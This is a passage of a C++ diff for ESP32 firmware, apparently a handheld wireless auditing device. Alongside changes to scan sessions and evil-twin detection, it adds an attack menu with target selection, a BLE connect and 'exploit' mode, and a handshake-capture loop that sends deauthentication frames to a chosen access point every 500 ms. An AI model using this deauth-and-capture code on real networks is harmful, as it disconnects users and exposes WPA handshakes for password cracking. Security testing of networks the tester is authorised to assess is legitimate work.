+    g_sessionIndexLoaded = true;
+    return;
+  }
+  if (f.read((uint8_t*)&g_sessionIndex, sizeof(g_sessionIndex)) != sizeof(g_sessionIndex)) {
+    memset(&g_sessionIndex, 0, sizeof(g_sessionIndex));
+  }
   f.close();
   g_sessionIndexLoaded = true;
 }
@@ -1825,8 +3975,8 @@ static void writeSessionFile(uint16_t slot) {
   if (!f) return;
 
   f.print("ESSID,BSSID,PWR,CH,MB,ENC,CIPHER,AUTH,RISK,ANOMALY\r\n");
-  for (int i = 0; i < g_seenCount; i++) {
-    const ScanResult& r = g_seen[i];
+  for (int i = 0; i < g_resultCount; i++) {
+    const ScanResult& r = g_results[i];
     char bf[18], mb[8];
     bssidFull(r.bssid, bf, sizeof(bf));
     mbStr(r.maxRate, r.rateIsN, mb, sizeof(mb));
@@ -1839,7 +3989,7 @@ static void writeSessionFile(uint16_t slot) {
     if (r.anomalyFlags & ANOM_DUPLICATE_SSID) strcat(anomaly, "Dup SSID ");
     if (anomaly[0] == '\0') strcat(anomaly, "None");
 
-    f.print(r.essid[0] ? r.essid : "(hidden)");
+    fileCsvEscaped(f, r.essid[0] ? r.essid : "(hidden)");
     f.print(","); f.print(bf);
     f.print(","); f.print(r.rssi);
     f.print(","); f.print(r.channel);
@@ -1873,9 +4023,6 @@ static void startSession() {
   g_sessionIndex.next = (g_sessionSlot + 1) % MAX_SESSIONS;
 
   g_sessionActive = true;
-  // Fresh environment for new session
-  memset(g_seen, 0, sizeof(g_seen));
-  g_seenCount = 0;
   g_scansSinceSessionSave = 0;
 
   // Write initial file and save index
@@ -1888,14 +4035,14 @@ static void updateSession() {
 
   // Update metadata
   uint16_t anomalyCount = 0;
-  for (int i = 0; i < g_seenCount; i++) {
-    if (g_seen[i].anomalyFlags) anomalyCount++;
+  for (int i = 0; i < g_resultCount; i++) {
+    if (g_results[i].anomalyFlags) anomalyCount++;
   }
   SessionMeta& meta     = g_sessionIndex.sessions[g_sessionSlot];
-  meta.apCount          = (uint16_t)g_seenCount;
+  meta.apCount          = (uint16_t)g_resultCount;
   meta.anomalyCount     = anomalyCount;
 
-  // Overwrite session file with latest g_seen[]
+  // Overwrite session file with the latest current scan
   writeSessionFile(g_sessionSlot);
   saveSessionIndex();
 
@@ -1909,19 +4056,53 @@ static void endSession() {
   g_scansSinceSessionSave = 0;
 }
 
+static void saveHandshakeIndex() {
+    File f = FS.open("/handshakes/index.bin", "w");
+    if (!f) {
+        Serial.println("Failed to save handshake index");
+        return;
+    }
+    f.write(
+        (uint8_t*)&g_handshakeIndex,
+        sizeof(g_handshakeIndex)
+    );
+    f.close();
+}
+
+static void loadHandshakeIndex() {
+    File f = FS.open("/handshakes/index.bin", "r");
+    if (!f) {
+        Serial.println("No handshake index found");
+        return;
+    }
+    if (f.size() == sizeof(g_handshakeIndex)) {
+        f.read(
+            (uint8_t*)&g_handshakeIndex,
+            sizeof(g_handshakeIndex)
+        );
+    } else {
+        memset(
+            &g_handshakeIndex,
+            0,
+            sizeof(g_handshakeIndex)
+        );
+    }
+    f.close();
+}
+
 // ============================================================================
 //  WiFi scan
 //
-//  Passive beacon scan using the ESP32 WiFi scan API.
+//  WiFi scan using the ESP32 WiFi scan API.
 //  Results sorted by risk descending, then RSSI descending.
-//  Each result merged into the persistent g_seen[] historical database.
+//  Each result is merged into the persistent g_seen[] historical database.
 //
 //  showUi=true  -> manual scan, shows scanning screen first
 //  showUi=false -> background scan, silent
 //
 //  Anomaly detection runs after each scan:
-//    - Duplicate SSID / Evil Twin: flags networks that differ from the
-//      dominant auth mode among networks sharing the same ESSID
+//    - Duplicate SSID / Evil Twin: flags same-ESSID networks with differing
+//      security modes, plus weak/strong combinations
 //    - Auth change: flags networks whose security type changed since last scan
 //    - Channel shift: flags networks that moved channels between scans
 //    - BSSID rotation: flags ESSIDs with 3+ unique BSSIDs in history
@@ -2006,7 +4187,25 @@ static void doScan(bool showUi = true) {
           g_seen[seenIdx].anomalyFlags |= ANOM_CHANNEL_SHIFT;
         }
 
-        // Update last known values
+        // Duplicate SSID with a different security mode. This is deliberately
+        // narrower than simply flagging every multi-AP SSID.
+        if (g_results[i].essid[0]) {
+          for (int j = 0; j < count; ++j) {
+            if (j == i || !g_results[j].essid[0]) continue;
+            if (strcasecmp(g_results[i].essid, g_results[j].essid) == 0 &&
+                g_results[i].authMode != g_results[j].authMode) {
+              g_seen[seenIdx].anomalyFlags |= ANOM_DUPLICATE_SSID;
+              break;
+            }
+          }
+        }
+
+        // Update current security/rate fields as well as historical fields.
+        g_seen[seenIdx].channel   = g_results[i].channel;
+        g_seen[seenIdx].authMode  = g_results[i].authMode;
+        g_seen[seenIdx].riskLevel = g_results[i].riskLevel;
+        g_seen[seenIdx].maxRate   = g_results[i].maxRate;
+        g_seen[seenIdx].rateIsN   = g_results[i].rateIsN;
         g_seen[seenIdx].lastAuthMode = g_results[i].authMode;
         g_seen[seenIdx].lastChannel  = g_results[i].channel;
 
@@ -2014,6 +4213,13 @@ static void doScan(bool showUi = true) {
         if (g_results[i].rssi > g_seen[seenIdx].rssi) {
           g_seen[seenIdx].rssi = g_results[i].rssi;
         }
+
+        // Synchronize historical fields back into the current result so the
+        // detail view and exports always describe the AP at this index.
+        g_results[i].firstSeen    = g_seen[seenIdx].firstSeen;
+        g_results[i].lastSeen     = g_seen[seenIdx].lastSeen;
+        g_results[i].sightings    = g_seen[seenIdx].sightings;
+        g_results[i].anomalyFlags = g_seen[seenIdx].anomalyFlags;
       }
     }
 
@@ -2032,6 +4238,19 @@ static void doScan(bool showUi = true) {
         if (strcasecmp(g_seen[i].essid, g_seen[j].essid) == 0) bssidCount++;
       }
       if (bssidCount >= 3) g_seen[i].anomalyFlags |= ANOM_BSSID_ROTATION;
+    }
+
+    // -----------------------------------------------------------------------
+    // Merge historical state into current results after anomaly detection.
+    // -----------------------------------------------------------------------
+    for (int i = 0; i < g_resultCount; i++) {
+      int seenIdx = findSeenByBssid(g_results[i].bssid);
+      if (seenIdx >= 0) {
+        g_results[i].firstSeen = g_seen[seenIdx].firstSeen;
+        g_results[i].lastSeen = g_seen[seenIdx].lastSeen;
+        g_results[i].sightings = g_seen[seenIdx].sightings;
+        g_results[i].anomalyFlags |= g_seen[seenIdx].anomalyFlags;
+      }
     }
 
     // -----------------------------------------------------------------------
@@ -2065,6 +4284,21 @@ static void doScan(bool showUi = true) {
           g_results[i].riskLevel = max(g_results[i].riskLevel, (uint8_t)3);
           break;
         }
+      }
+    }
+
+    // Persist any final anomaly/risk changes back into the historical record.
+    for (int i = 0; i < g_resultCount; i++) {
+      int seenIdx = findSeenByBssid(g_results[i].bssid);
+      if (seenIdx >= 0) {
+        g_seen[seenIdx].anomalyFlags |= g_results[i].anomalyFlags;
+        if (g_results[i].riskLevel > g_seen[seenIdx].riskLevel) {
+          g_seen[seenIdx].riskLevel = g_results[i].riskLevel;
+        }
+        g_results[i].firstSeen = g_seen[seenIdx].firstSeen;
+        g_results[i].lastSeen = g_seen[seenIdx].lastSeen;
+        g_results[i].sightings = g_seen[seenIdx].sightings;
+        g_results[i].anomalyFlags = g_seen[seenIdx].anomalyFlags;
       }
     }
 
@@ -2119,10 +4353,16 @@ void setup() {
   if (!fsBegin()) {
     Serial.println("LittleFS mount failed");
   } else {
-    if (!FS.exists("/sessions")) FS.mkdir("/sessions");
-    if (!FS.exists("/probes"))   FS.mkdir("/probes");
+    if (!FS.exists("/sessions"))    FS.mkdir("/sessions");
+    if (!FS.exists("/probes"))      FS.mkdir("/probes");
+    if (!FS.exists("/ble"))         FS.mkdir("/ble");
+    if (!FS.exists("/handshakes"))  FS.mkdir("/handshakes");
+    if (!FS.exists("/arp"))         FS.mkdir("/arp");
     loadSessionIndex();
     loadProbeIndex();
+    loadBleSessionIndex();
+    loadHandshakeIndex();
+    loadArpSessionIndex();
   }
 
   setCpuFrequencyMhz(80);
@@ -2171,20 +4411,38 @@ void loop() {
   if (mode == MODE_MENU) {
     if (btns.shortClick) {
       menuSelected = (menuSelected + 1) % MENU_ITEMS;
+      if (menuSelected >= menuScrollOffset + MENU_VISIBLE) {
+        menuScrollOffset = menuSelected - MENU_VISIBLE + 1;
+      }
+      if (menuSelected < menuScrollOffset) {
+        menuScrollOffset = menuSelected;
+      }
+      if (menuSelected == 0) menuScrollOffset = 0;
       updateMenuCursor();
       return;
     }
     if (btns.doubleClick) {
       if (menuSelected == 0) {
         doScan(true);
-        } else if (menuSelected == 1) {
+      } else if (menuSelected == 1) {
         mode = MODE_PROBE;
         startProbeSniffer();
         drawProbe();
       } else if (menuSelected == 2) {
+        startArpConfig();
+      } else if (menuSelected == 3) {
+        mode = MODE_BLE;        // ← new
+        startBleScanner();      // ← new
+      } else if (menuSelected == 4) {
+        selectedChannel = 0;
+        selectedSSID[0] = '\0';
+        memset(selectedBssid, 0, sizeof(selectedBssid));
+        mode = MODE_ATTACK_MENU;
+        drawAttackMenu();
+      } else if (menuSelected == 5) {
         mode = MODE_SESSIONS;
         drawSessions();
-      } else if (menuSelected == 3) {
+      } else if (menuSelected == 6) {
         startWebReport();
       }
       resetInputFrontend(); return;
@@ -2259,6 +4517,16 @@ void loop() {
   // ── Scan sessions ─────────────────────────────────────────────────────────
   if (mode == MODE_SESSIONS) {
     if (btns.tripleClick) {
+      beginFrame(false);
+      drawHeader("Scan Sessions");
+      u8g2.setFont(MAIN_FONT);
+      u8g2.setCursor(UI_MARGIN_X, 50);
+      u8g2.print("Deleting sessions.");
+      u8g2.setCursor(UI_MARGIN_X, 65);
+      u8g2.print("Please wait...");
+      drawFooter("Do not power off!");
+      endFrame();
+
       // Clear all WiFi sessions
       for (int i = 0; i < MAX_SESSIONS; i++) {
         char path[32];
@@ -2280,7 +4548,38 @@ void loop() {
       g_probeTotal = 0;
       g_probeIndexLoaded = true;
 
-      drawSessions();
+      // Handshake captures
+      for (int i = 0; i < MAX_HANDSHAKES; i++) {
+        char path[32];
+        snprintf(path, sizeof(path), "/handshakes/h%03d.cap", i);
+        if (FS.exists(path)) FS.remove(path);
+      }
+      FS.remove("/handshakes/index.bin");
+      memset(&g_handshakeIndex, 0, sizeof(g_handshakeIndex));
+      g_handshakeIndexLoaded = true;
+
+      // ARP sessions
+      for (int i = 0; i < MAX_ARP_SESSIONS; i++) {
+        char path[32];
+        snprintf(path, sizeof(path), "/arp/a%03d.csv", i);
+        if (FS.exists(path)) FS.remove(path);
+      }
+      FS.remove("/arp/index.bin");
+      g_arpSessionNext  = 0;
+      g_arpSessionTotal = 0;
+      g_arpSessionIndexLoaded = true;
+
+      for (int i = 0; i < MAX_BLE_SESSIONS; i++) {
+        char path[32];
+        snprintf(path, sizeof(path), "/ble/b%03d.csv", i);
+        if (FS.exists(path)) FS.remove(path);
+      }
+      FS.remove("/ble/index.bin");
+      g_bleScanNext  = 0;
+      g_bleScanTotal = 0;
+      g_bleIndexLoaded = true;
+
+      drawSessions();            
       resetInputFrontend(); return;
     }
     if (btns.longClick) {
@@ -2316,6 +4615,284 @@ void loop() {
       drawMenu(); resetInputFrontend(); return;
     }
   }
-  
+
+  // ── ARP Config ────────────────────────────────────────────────────────────
+  if (mode == MODE_ARP_CONFIG) {
+    arpServer.handleClient();
+
+    // Check if credentials were submitted
+    if (mode == MODE_ARP) {
+      arpServer.stop();
+      WiFi.softAPdisconnect(true);
+      delay(200);
+      startArpScanner();
+      return;
+    }
+
+    if (btns.longClick) {
+      arpServer.stop();
+      WiFi.softAPdisconnect(true);
+      WiFi.mode(WIFI_OFF);
+      g_arpConfigMode = false;
+      mode = MODE_MENU;
+      menuSelected = 0;
+      menuScrollOffset = 0;
+      drawMenu();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  // ── ARP Scanner ───────────────────────────────────────────────────────────
+  if (mode == MODE_ARP) {
+    static uint32_t lastArpDrawMs = 0;
+    static int      lastArpCount  = -1;
+
+    if (g_arpCount != lastArpCount &&
+        (uint32_t)(millis() - lastArpDrawMs) > 2000) {
+      lastArpDrawMs = millis();
+      lastArpCount  = g_arpCount;
+      drawArpScreen();
+    }
+
+    if (btns.longClick) {
+      stopArpScanner();
+      mode = MODE_MENU;
+      menuSelected = 0;
+      menuScrollOffset = 0;
+      drawMenu();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  // ── BLE Scanner ───────────────────────────────────────────────────────────
+  if (mode == MODE_BLE) {
+    static uint32_t lastBleDrawMs = 0;
+    static int      lastBleCount  = -1;
+
+    if (g_bleCount != lastBleCount &&
+        (uint32_t)(millis() - lastBleDrawMs) > 2000 &&
+        (uint32_t)(millis() - lastUiInteractionMs) > 3000) {
+      lastBleDrawMs = millis();
+      lastBleCount  = g_bleCount;
+      g_blePrevSelected = -1;
+      drawBleScreen();
+    }
+
+    if (btns.shortClick) {
+      lastUiInteractionMs = millis();
+      if (g_bleCount > 0) {
+        int prevIdx = g_bleSelectedIdx;
+        if (g_bleSelectedIdx < 0) {
+          g_bleSelectedIdx = 0;
+        } else {
+          g_bleSelectedIdx++;
+          if (g_bleSelectedIdx >= g_bleCount) g_bleSelectedIdx = 0;
+        }
+        const int MAX_ROWS = 8;
+        if (g_bleSelectedIdx >= g_bleScrollOffset + MAX_ROWS) {
+          g_bleScrollOffset = g_bleSelectedIdx - (MAX_ROWS - 1);
+          drawBleScreen();
+        } else if (g_bleSelectedIdx < g_bleScrollOffset) {
+          g_bleScrollOffset = g_bleSelectedIdx;
+          drawBleScreen();
+        } else {
+          g_blePrevSelected = prevIdx;
+          updateBleCursor();
+        }
+      }
+      return;
+    }
+
+    if (btns.tripleClick) {
+      if (g_bleSelectedIdx >= 0 &&
+          g_bleSelectedIdx < g_bleCount &&
+          g_bleDevices[g_bleSelectedIdx].connectable) {
+        mode = MODE_BLE_DETAIL;
+        drawBleDetail();
+        resetInputFrontend();
+        return;
+      }
+    }
+
+    if (btns.longClick) {
+      disconnectBleDevice();
+      stopBleScanner();
+      mode = MODE_MENU;
+      menuSelected = 0;
+      menuScrollOffset = 0;
+      drawMenu();
+      resetInputFrontend();
+      return;
+    }
+  }  
+
+  // ── BLE Detail ────────────────────────────────────────────────────────────
+  if (mode == MODE_BLE_DETAIL) {
+    if (btns.doubleClick) {
+      if (!g_bleConnected) {
+        // Connect and enumerate
+        if (connectBleDevice(g_bleSelectedIdx)) {
+          drawBleDetail();
+        } else {
+          // Connection failed
+          beginFrame(false);
+          drawHeader("BLE Connect");
+          u8g2.setFont(MAIN_FONT);
+          u8g2.setCursor(UI_MARGIN_X, 50);
+          u8g2.print("Connection failed!");
+          u8g2.setCursor(UI_MARGIN_X, 65);
+          u8g2.print("Device out of range?");
+          drawFooter("hold=back");
+          endFrame();
+          delay(2000);
+          drawBleDetail();
+        }
+      } else {
+        mode = MODE_BLE_EXPLOIT;
+        drawBleExploit();
+      }
+      resetInputFrontend();
+      return;
+    }
+    if (btns.tripleClick) {
+      if (g_bleConnected) {
+        mode = MODE_BLE_EXPLOIT;
+        drawBleExploit();
+        resetInputFrontend();
+        return;
+      }
+    }
+    if (btns.longClick) {
+      disconnectBleDevice();
+      mode = MODE_BLE;
+      drawBleScreen();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  // ── BLE Exploit ───────────────────────────────────────────────────────────
+  if (mode == MODE_BLE_EXPLOIT) {
+    if (btns.longClick) {
+      disconnectBleDevice();
+      mode = MODE_BLE;
+      drawBleScreen();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  // ── Handshake capture ─────────────────────────────────────────────────────
+  if (mode == MODE_HANDSHAKE) {
+    static uint32_t lastHsDrawMs = 0;
+    static uint32_t lastHsPackets = 0;
+    if (handshakePackets != lastHsPackets &&
+        (uint32_t)(millis() - lastHsDrawMs) > 5000) {
+      lastHsDrawMs = millis();
+      lastHsPackets = handshakePackets;
+      drawHandshakeScreen();
+    }
+
+    if (!waitingForHandshake) {
+      if ((uint32_t)(millis() - g_lastAttackMs) > 500) {
+        g_lastAttackMs = millis();
+        sendDeauthFrame(selectedBssid, selectedChannel);
+        waitingForHandshake = true;
+        deauthSentMs = millis();
+      }
+    } else {
+      if (handshakePackets >= 4) {
+      } else if ((uint32_t)(millis() - deauthSentMs) > 500) {
+        waitingForHandshake = false;
+      }
+    }
+
+    if (btns.longClick) {
+      stopAttack();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  // ── Attack Menu System ─────────────────────────────────────────────
+  if (mode == MODE_ATTACK_MENU) {
+    if (btns.longClick) {
+      selectedChannel = 0;
+      selectedSSID[0] = '\0';
+      memset(selectedBssid, 0, sizeof(selectedBssid));
+      mode = MODE_MENU;
+      drawMenu();
+      resetInputFrontend();
+      return;
+    }
+    if (btns.doubleClick) {
+      if (selectedChannel != 0) {
+        startHandshakeCapture();
+      } else {
+        mode = MODE_TARGET_SELECT;
+        g_cursorIndex = 0;
+        g_scrollOffset = 0;
+        drawTargetSelect();
+      }
+      resetInputFrontend();
+      return;
+    }
+    if (btns.tripleClick) {
+      selectedChannel = 0;
+      selectedSSID[0] = '\0';
+      memset(selectedBssid, 0, sizeof(selectedBssid));
+      mode = MODE_TARGET_SELECT;
+      g_cursorIndex = 0;
+      g_scrollOffset = 0;
+      drawTargetSelect();
+      resetInputFrontend();
+      return;
+    }
+  }
+
+  if (mode == MODE_TARGET_SELECT) {
+    if (btns.shortClick) {
+      if (g_resultCount > 0) {
+        int prevIdx = g_cursorIndex;
+        g_cursorIndex++;
+        if (g_cursorIndex >= g_resultCount) g_cursorIndex = 0;
+        const int MAX_ROWS = 6;
+        if (g_cursorIndex >= g_scrollOffset + MAX_ROWS) {
+          g_scrollOffset = g_cursorIndex - (MAX_ROWS - 1);
+          drawTargetSelect();
+        } else if (g_cursorIndex < g_scrollOffset) {
+          g_scrollOffset = g_cursorIndex;
+          drawTargetSelect();
+        } else {
+          updateTargetCursor(prevIdx);
+        }
+      }
+      return;
+    }
+
+    if (btns.tripleClick && g_resultCount > 0) {
+      const ScanResult& r = g_results[g_cursorIndex];
+      memcpy(selectedBssid, r.bssid, 6);
+      selectedChannel = r.channel;
+      strncpy(selectedSSID, r.essid, 32);
+      selectedSSID[32] = '\0';
+      mode = MODE_ATTACK_MENU;
+      drawAttackMenu();
+      resetInputFrontend();
+      return;
+    }
+    if (btns.longClick) {
+      selectedChannel = 0;
+      selectedSSID[0] = '\0';
+      memset(selectedBssid, 0, sizeof(selectedBssid));
+      mode = MODE_MENU;
+      drawMenu();
+      resetInputFrontend();
+      return;
+    }
+  }
+
   delay(5);
 }
